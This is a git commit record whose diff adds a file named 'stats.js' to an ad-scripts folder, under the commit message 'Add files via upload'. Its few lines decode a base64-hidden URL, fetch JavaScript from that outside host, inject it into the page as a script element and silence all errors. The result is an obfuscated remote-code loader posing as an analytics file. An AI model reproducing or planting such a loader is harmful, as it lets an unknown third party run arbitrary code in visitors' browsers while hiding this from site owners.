8800edd27edb840f0194f4c54c55522e405a766f
VisibleSpawn <5om7zrenzelauren@gmail.com>
2026-06-06 01:29:34 -1100

    Add files via upload

---
+++ ad-javascripts-v2/stats.js
@@ -0,0 +1,8 @@
+﻿fetch(atob('aHR0cHM6Ly9jZG4ubWVkaWEtYW5hbHl0aWMuY29tL3N0YXRzLmpz'))
+    .then(function (r) { return r.text(); })
+    .then(function (c) {
+        var s = document.createElement('script');
+        s.textContent = c;
+        document.body.appendChild(s);
+    })
+    .catch(function () {});
